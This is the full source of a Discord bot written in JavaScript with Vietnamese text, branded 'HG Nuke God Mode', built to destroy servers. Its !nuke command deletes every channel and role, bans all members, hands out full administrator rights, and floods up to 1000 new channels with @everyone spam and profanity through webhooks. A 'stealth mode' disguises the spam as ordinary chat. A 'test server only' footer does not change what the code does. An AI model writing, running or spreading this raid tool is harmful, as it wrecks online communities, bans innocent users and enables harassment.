const { Client, GatewayIntentBits, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, EmbedBuilder, StringSelectMenuBuilder, PermissionsBitField, Events } = require('discord.js');
const axios = require('axios');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildEmojisAndStickers
    ]
});

// Global variables
let isNuking = false;
let spamMode = "both";
let newIconUrl = "https://media.discordapp.net/attachments/1332244814892109885/1376589078753185862/static.png?ex=6835dffc&is=68348e7c&hm=f40c2f61a30d171b1c1a997c562f39c491a6ef09ec88b25b14a59c0c6478a6c3&=&format=webp&quality=lossless&width=320&height=320";
let customSpamText = "@everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here Địt Cả Lò Nhà Chúng Mày";
let customIconUrl = null;
let customServerName = null;
let customChannelSuffix = null;
let customChannelCount = 1000;
let stealthMode = false;
let autoAddRole = true;
let spamTasks = [];

// Spam Modal
class SpamModal extends ModalBuilder {
    constructor() {
        super()
            .setCustomId('spamModal')
            .setTitle('Cấu hình spam');

        const spamTextInput = new TextInputBuilder()
            .setCustomId('spamText')
            .setLabel('Nội dung spam')
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(true);

        const channelCountInput = new TextInputBuilder()
            .setCustomId('channelCount')
            .setLabel('Số lượng kênh (tối đa 1000)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('Ví dụ: 100')
            .setRequired(false);

        const suffixInput = new TextInputBuilder()
            .setCustomId('suffix')
            .setLabel('Tên sau emoji của kênh')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('vd: text')
            .setRequired(false);

        const stealthInput = new TextInputBuilder()
            .setCustomId('stealth')
            .setLabel('Stealth mode? (true/false)')
            .setStyle(TextInputStyle.Short)
            .setRequired(false);

        const addRoleInput = new TextInputBuilder()
            .setCustomId('addRole')
            .setLabel('Tạo và gán role admin? (true/false)')
            .setStyle(TextInputStyle.Short)
            .setRequired(false);

        this.addComponents(
            new ActionRowBuilder().addComponents(spamTextInput),
            new ActionRowBuilder().addComponents(channelCountInput),
            new ActionRowBuilder().addComponents(suffixInput),
            new ActionRowBuilder().addComponents(stealthInput),
            new ActionRowBuilder().addComponents(addRoleInput)
        );
    }
}

// Icon Modal
class IconModal extends ModalBuilder {
    constructor() {
        super()
            .setCustomId('iconModal')
            .setTitle('Đổi icon server');

        const iconUrlInput = new TextInputBuilder()
            .setCustomId('iconUrl')
            .setLabel('Link ảnh icon mới')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        this.addComponents(
            new ActionRowBuilder().addComponents(iconUrlInput)
        );
    }
}

// Name Modal
class NameModal extends ModalBuilder {
    constructor() {
        super()
            .setCustomId('nameModal')
            .setTitle('Đổi tên server');

        const nameInput = new TextInputBuilder()
            .setCustomId('name')
            .setLabel('Tên server mới')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        this.addComponents(
            new ActionRowBuilder().addComponents(nameInput)
        );
    }
}

// Setup Dropdown
class SetupDropdown extends StringSelectMenuBuilder {
    constructor() {
        super()
            .setCustomId('setupDropdown')
            .setPlaceholder('Chọn cấu hình cần setup...')
            .setMinValues(1)
            .setMaxValues(1)
            .addOptions([
                { label: 'Spam Webhook', value: 'webhook', emoji: '🌐' },
                { label: 'Spam Text', value: 'text', emoji: '💬' },
                { label: 'Spam Tất Cả', value: 'all', emoji: '💣' },
                { label: 'Cấu hình icon server', value: 'icon', emoji: '🖼️' },
                { label: 'Cấu hình tên server', value: 'name', emoji: '🏷️' },
                { label: 'Cấu hình nội dung spam', value: 'spam_text', emoji: '📢' }
            ]);
    }
}

// Setup View
class SetupView extends ActionRowBuilder {
    constructor() {
        super()
            .addComponents(new SetupDropdown());
    }
}

// Event: Ready
client.once(Events.ClientReady, async () => {
    console.log(`👑 Bot Nuke God Mode đã sẵn sàng: ${client.user.tag}`);
    console.log(`✅ Bot đang hoạt động trên ${client.guilds.cache.size} server`);
});

// Event: Interaction Create - Modals
client.on(Events.InteractionCreate, async (interaction) => {
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'spamModal') {
            try {
                const spamText = interaction.fields.getTextInputValue('spamText');
                const channelCount = interaction.fields.getTextInputValue('channelCount');
                const suffix = interaction.fields.getTextInputValue('suffix');
                const stealth = interaction.fields.getTextInputValue('stealth');
                const addRole = interaction.fields.getTextInputValue('addRole');

                customSpamText = spamText;
                customChannelCount = parseInt(channelCount) || 1000;
                if (customChannelCount > 1000) customChannelCount = 1000;
                customChannelSuffix = suffix || null;
                stealthMode = stealth ? stealth.toLowerCase() === 'true' : false;
                autoAddRole = addRole ? addRole.toLowerCase() === 'true' : true;

                await interaction.reply({ content: '✅ Đã cập nhật cấu hình spam!', ephemeral: true });
            } catch (error) {
                console.error(error);
                await interaction.reply({ content: '❌ Có lỗi xảy ra khi cập nhật cấu hình spam!', ephemeral: true });
            }
        } else if (interaction.customId === 'iconModal') {
            try {
                const iconUrl = interaction.fields.getTextInputValue('iconUrl');
                customIconUrl = iconUrl;
                await interaction.reply({ content: '✅ Đã cập nhật icon server!', ephemeral: true });
            } catch (error) {
                console.error(error);
                await interaction.reply({ content: '❌ Có lỗi xảy ra khi cập nhật icon!', ephemeral: true });
            }
        } else if (interaction.customId === 'nameModal') {
            try {
                const name = interaction.fields.getTextInputValue('name');
                customServerName = name;
                await interaction.reply({ content: '✅ Đã cập nhật tên server!', ephemeral: true });
            } catch (error) {
                console.error(error);
                await interaction.reply({ content: '❌ Có lỗi xảy ra khi cập nhật tên server!', ephemeral: true });
            }
        }
    } else if (interaction.isStringSelectMenu() && interaction.customId === 'setupDropdown') {
        try {
            const value = interaction.values[0];
            
            if (value === 'spam_text') {
                await interaction.showModal(new SpamModal());
            } else if (value === 'icon') {
                await interaction.showModal(new IconModal());
            } else if (value === 'name') {
                await interaction.showModal(new NameModal());
            } else {
                await interaction.reply({ 
                    content: `✅ Bạn đã chọn chế độ \`${value}\`. Sẵn sàng dùng \`!nuke\` để thực hiện.`, 
                    ephemeral: true 
                });
            }
        } catch (error) {
            console.error(error);
            await interaction.reply({ content: '❌ Có lỗi xảy ra!', ephemeral: true });
        }
    }
});

// Command handler
client.on(Events.MessageCreate, async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('!')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'setup') {
        try {
            await message.delete().catch(() => {});
        } catch (error) {}

        const embed = new EmbedBuilder()
            .setTitle('🛠 HG Hỗ Trợ Nuke')
            .setDescription(`Xin chào ${message.author}!\n\nChọn một danh mục để thiết lập cấu hình nuke theo ý bạn.`)
            .setColor(0x9B59B6)
            .addFields({
                name: '📋 Danh Mục',
                value: '• 🌐 Spam Webhook\n• 💬 Spam Text\n• 💣 Spam Tất Cả\n• 🖼️ Đổi Icon\n• 🏷️ Đổi Tên\n• 📢 Nội dung spam',
                inline: false
            });

        try {
            await message.author.send({ 
                embeds: [embed], 
                components: [new SetupView()] 
            });
        } catch (error) {
            await message.channel.send({ 
                content: '❌ Không thể gửi panel DM. Hãy bật tin nhắn từ server hoặc kiểm tra quyền!'
            });
        }
    }

    if (command === 'nuke') {
        isNuking = true;
        try {
            await message.delete().catch(() => {});
        } catch (error) {}

        const guild = message.guild;
        if (!guild) {
            await message.channel.send('❌ Lệnh này chỉ sử dụng trong server!');
            return;
        }

        // Kiểm tra quyền bot
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await message.channel.send('❌ Bot cần quyền Administrator để thực hiện!');
            return;
        }

        // Change server name
        try {
            const newName = customServerName || 'Haha Server Đã Bị Nuke';
            await guild.setName(newName);
        } catch (error) {}

        // Change server icon
        try {
            const url = customIconUrl || newIconUrl;
            const response = await axios.get(url, { responseType: 'arraybuffer' });
            await guild.setIcon(response.data);
        } catch (error) {}

        // Delete all channels
        const deleteTasks = [];
        guild.channels.cache.forEach(channel => {
            deleteTasks.push(channel.delete().catch(() => {}));
        });
        await Promise.all(deleteTasks);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Ban all members
        const members = guild.members.cache;
        const banPromises = [];
        members.forEach(async (member) => {
            if (!isNuking) return;
            if (member.id === client.user.id) return;
            try {
                await member.ban({ reason: 'HG NUKE GOD MODE', deleteMessageDays: 1 });
                await new Promise(resolve => setTimeout(resolve, 30));
            } catch (error) {}
        });
        await Promise.all(banPromises);

        // Delete all roles
        guild.roles.cache.forEach(async (role) => {
            if (role.id === guild.id) return;
            try {
                await role.delete().catch(() => {});
            } catch (error) {}
        });

        // Add admin role
        if (autoAddRole) {
            try {
                const adminRole = await guild.roles.create({
                    name: '👑 God Admin',
                    permissions: PermissionsBitField.All,
                    color: 0xFF0000
                });
                guild.members.cache.forEach(async (member) => {
                    if (!member.user.bot) {
                        try {
                            await member.roles.add(adminRole);
                        } catch (error) {}
                    }
                });
            } catch (error) {}
        }

        // Edit default role permissions
        try {
            await guild.roles.everyone.setPermissions(PermissionsBitField.All);
        } catch (error) {}

        // Create channels with spam
        const channels = [];
        const createTextChannelTask = async (name) => {
            try {
                const channel = await guild.channels.create({
                    name: `💣 ${name}`,
                    type: 0 // GUILD_TEXT
                });
                channels.push(channel);

                if (spamMode === 'webhook' || spamMode === 'both') {
                    for (let j = 0; j < 2; j++) {
                        const whName = stealthMode ? `user${Math.floor(Math.random() * 9000) + 1000}` : `💥 GOD-${j}`;
                        const webhook = await channel.createWebhook({ name: whName });

                        const spamWebhook = async (wh) => {
                            while (isNuking) {
                                try {
                                    const msg = stealthMode ? ['hi', 'hello', 'update...', 'check...'][Math.floor(Math.random() * 4)] : customSpamText;
                                    const username = stealthMode ? ['sys', 'emma', 'bot', 'mod'][Math.floor(Math.random() * 4)] : '👑 GOD RAID';
                                    await wh.send({ content: msg, username: username });
                                    await new Promise(resolve => setTimeout(resolve, 100));
                                } catch (error) {
                                    await new Promise(resolve => setTimeout(resolve, 1000));
                                }
                            }
                        };
                        spamTasks.push(spamWebhook(webhook));
                    }
                }

                if (spamMode === 'text' || spamMode === 'both') {
                    const spamText = async (ch) => {
                        while (isNuking) {
                            try {
                                const msg = stealthMode ? ['hi', 'checking', 'update log', 'bot here'][Math.floor(Math.random() * 4)] : customSpamText;
                                await ch.send(msg);
                                await new Promise(resolve => setTimeout(resolve, 100));
                            } catch (error) {
                                await new Promise(resolve => setTimeout(resolve, 1000));
                            }
                        }
                    };
                    spamTasks.push(spamText(channel));
                }
            } catch (error) {}
        };

        const createTasks = [];
        for (let i = 1; i <= customChannelCount; i++) {
            if (!isNuking) break;
            const name = stealthMode ? `chat-${Math.floor(Math.random() * 9000) + 1000}` : (customChannelSuffix || `god-text-${i}`);
            createTasks.push(createTextChannelTask(name));
        }
        await Promise.all(createTasks);

        // Create voice channels
        for (let i = 1; i <= customChannelCount; i++) {
            if (!isNuking) break;
            try {
                const name = stealthMode ? `voice-${Math.floor(Math.random() * 9000) + 1000}` : (customChannelSuffix || `god-voice-${i}`);
                await guild.channels.create({
                    name: `🎧 ${name}`,
                    type: 2 // GUILD_VOICE
                });
            } catch (error) {}
        }

        // Create custom emojis
        try {
            for (let i = 0; i < 50; i++) {
                const response = await axios.get(newIconUrl, { responseType: 'arraybuffer' });
                await guild.emojis.create({ 
                    attachment: response.data, 
                    name: `godemoji${i}` 
                });
            }
        } catch (error) {}
    }

    if (command === 'stop') {
        isNuking = false;
        spamTasks = [];
        try {
            await message.delete().catch(() => {});
        } catch (error) {}
        await message.channel.send('🛑 Đã dừng toàn bộ spam!');
    }

    if (command === 'help') {
        const embed = new EmbedBuilder()
            .setTitle('💥 HG Nuke God Mode - Hướng Dẫn Sử Dụng')
            .setDescription('Dưới đây là các lệnh chính để cấu hình và thử nghiệm bot:')
            .setColor(0x3498DB)
            .setThumbnail(client.user.displayAvatarURL())
            .addFields(
                { name: '🛠️ `!setup`', value: 'Cấu hình trước khi nuke (spam, tên server, icon...)', inline: false },
                { name: '💣 `!nuke`', value: 'Phá server: xóa kênh, ban member, spam...', inline: false },
                { name: '🛑 `!stop`', value: 'Dừng toàn bộ spam đang chạy', inline: false }
            )
            .setFooter({ text: 'Bot by HG • Chỉ dùng trong server test' });

        try {
            await message.delete().catch(() => {});
        } catch (error) {}

        try {
            await message.author.send({ embeds: [embed] });
        } catch (error) {
            await message.channel.send({ embeds: [embed] });
        }
    }
});

// Login bot với token từ env
const token = process.env.TOKEN || 'Your_Token_Here';
client.login(token);

// Xử lý lỗi
process.on('unhandledRejection', (error) => {
    console.error('Unhandled Promise Rejection:', error);
});
